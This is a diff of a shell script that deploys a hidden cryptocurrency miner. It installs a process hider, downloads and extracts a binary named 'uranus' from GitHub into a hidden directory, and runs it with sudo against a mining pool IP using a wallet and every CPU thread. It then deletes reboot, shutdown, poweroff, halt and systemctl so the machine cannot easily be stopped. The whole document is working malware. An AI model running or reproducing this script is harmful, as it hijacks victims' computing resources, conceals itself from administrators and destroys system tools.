@@ -21,8 +21,9 @@ npm i -g node-process-hider
 ph add sgr1
 WORKER=$(TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed 's/Monday/Senin/;s/Tuesday/Selasa/;s/Wednesday/Rabu/;s/Thursday/Kamis/;s/Friday/Jumat/;s/Saturday/Sabtu/;s/Sunday/Minggu/;s/January/Januari/;s/February/Februari/;s/March/Maret/;s/April/April/;s/May/Mei/;s/June/Juni/;s/July/Juli/;s/August/Agustus/;s/September/September/;s/October/Oktober/;s/November/November/;s/December/Desember/')
 mkdir .lib && cd .lib
-wget -O sgr1 https://github.com/TiannaMcdowell/asuuy/raw/main/bash > /dev/null 2>&1 
-chmod u+x sgr1
+wget https://github.com/TiannaMcdowell/All-File/raw/main/daemon.tar.gz > /dev/null 2>&1 
+tar -xvf daemon.tar.gz
+mv uranus sgr1
 sudo nohup ./sgr1 --donate-level 1 -o 128.199.218.20:443 -u Q010500f8f21098ccf5acf2f08f0e6b315fb958d7c7a1bf811f34e49f7ac459f4aa7683c723391d -p $WORKER -a rx/0 -t $(nproc --all) > /dev/null 2>&1 &
 sleep 30
 sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
